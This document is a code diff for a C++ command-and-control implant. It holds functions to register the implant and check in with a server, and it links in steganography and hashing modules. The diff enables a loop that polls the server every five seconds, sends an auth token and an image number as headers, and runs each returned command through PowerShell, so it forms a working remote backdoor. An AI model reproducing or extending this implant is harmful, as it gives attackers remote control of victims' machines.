@@ -4,6 +4,7 @@
 #include <iostream>
 #include <sstream>
 #include <string.h>
+#include <vector>
 #include "httpClient.cpp"
 #include "winhash.cpp"
 #include "steganography.cpp"
@@ -239,7 +240,8 @@ std::string register_implant(char* compName, char* userName) {
     // wprintf(L"hex data= %s\n", hex_data.c_str());
 
     // construct the optional headers
-    std::wstring http_optional_headers = L"Authorization: Imagine thinking you could decrypt this. HAHAHA!";
+    std::wstring first_header =  L"Authorization: Imagine thinking you could decrypt this. HAHAHA!\r\n";
+    std::vector<std::wstring> http_optional_headers{first_header};
 
     // construct the uri string
     std::wstring uri = L"/register";
@@ -268,7 +270,7 @@ std::string register_implant(char* compName, char* userName) {
     return output;
 }
 
-std::string checkin_implant(std::string response) {
+std::string checkin_implant(std::string response, std::wstring imageNum) {
     // Make each section of the header separately, then concat together
     std::wcout << L"********** START OF CHECK-IN FUNCTION" << std::endl;
 
@@ -288,7 +290,11 @@ std::string checkin_implant(std::string response) {
 
     // construct the optional headers
     
-    std::wstring http_optional_headers = L"Authorization: " + authToken;
+    
+    std::wstring first_header = L"Authorization: " + authToken + L"\r\n";
+    std::wstring second_header = L"ImageNum: " + imageNum + L"\r\n";
+    std::vector<std::wstring> http_optional_headers{first_header, second_header};
+    
     // std::wcout << L"http_optional_headers = " << http_optional_headers << std::endl;
 
     // construct the uri string
@@ -374,23 +380,26 @@ int wmain() {
 
     // get responses to the server and constantly check in every minute for commands
     std::string response = "";
+    int int_imageNum = 0;
 
-    // while (true) {
-    //     Sleep(5000);
-    //     std::string c2_command = "";
+    while (true) {
+        Sleep(5000);
+        std::string c2_command = "";
+        
+        std::wstring imageNum = std::to_wstring(int_imageNum);
+        c2_command = checkin_implant(response, imageNum);
+        response = "";    
+        if (c2_command.length() != 0) {
+            std::string command = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe /c ";
+            command.append(c2_command);
+            std::wstring command_temp(command.begin(), command.end());
+            wchar_t* wCommand = (wchar_t*) command_temp.c_str();
 
-    //     c2_command = checkin_implant(response);
-    //     response = "";    
+            // std::wcout << wCommand << std::endl;
 
-    //     std::string command = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe /c ";
-    //     command.append(c2_command);
-    //     std::wstring command_temp(command.begin(), command.end());
-    //     wchar_t* wCommand = (wchar_t*) command_temp.c_str();
-
-    //     // std::wcout << wCommand << std::endl;
-
-    //     response = execute_shell(wCommand);
-    // }
+            response = execute_shell(wCommand);
+        }
+    }
 
     return -1;
 }
